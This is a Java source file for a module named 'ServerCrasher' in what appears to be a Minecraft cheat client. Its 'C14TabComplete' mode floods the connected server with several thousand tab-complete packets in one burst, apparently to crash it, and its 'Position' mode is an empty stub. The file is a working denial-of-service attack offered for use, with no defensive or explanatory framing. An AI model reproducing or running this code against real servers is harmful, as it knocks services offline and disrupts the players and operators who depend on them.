package cn.snowflake.rose.mod.mods.WORLD;


import cn.snowflake.rose.Client;
import cn.snowflake.rose.events.impl.EventUpdate;
import cn.snowflake.rose.mod.Category;
import cn.snowflake.rose.mod.Module;
import cn.snowflake.rose.ui.notification.Notification;
import cn.snowflake.rose.utils.Value;
import com.darkmagician6.eventapi.EventTarget;
import net.minecraft.network.play.client.C14PacketTabComplete;

public class ServerCrasher extends Module {
    public Value<String> mode = new Value<String>("ServerCrasher_Mode", "Mode",0);

    private boolean speedTick;
    private double yVal;
    double health;
    boolean hasDamaged = false;
    boolean hasJumped = false;
    double posY = 0.0D;

    public ServerCrasher() {
        super("ServerCrasher","Server Crasher", Category.WORLD);
        this.mode.addValue("Position");
        this.mode.addValue("C14TabComplete");
        setChinesename("\u70b8\u670d");
    }

    @Override
    public String getDescription() {
        return "炸服!";
    }

    boolean changeY = false;


    @EventTarget
    public void onUpdate(EventUpdate eventUpdate){
        if (mode.isCurrentMode("Position")){

        }
    }


    public void onEnable() {
        if (mode.isCurrentMode("C14TabComplete")){
            int packets = 0;
            for (int i = 0; i < (1337 * 5); i++) {
                mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
                packets += 1;
            }
            Client.instance.getNotificationManager().addNotification(this,"Packet : " + packets, Notification.Type.INFO);
            set(false);
        }
    }

    public void onDisable() {
    }


}

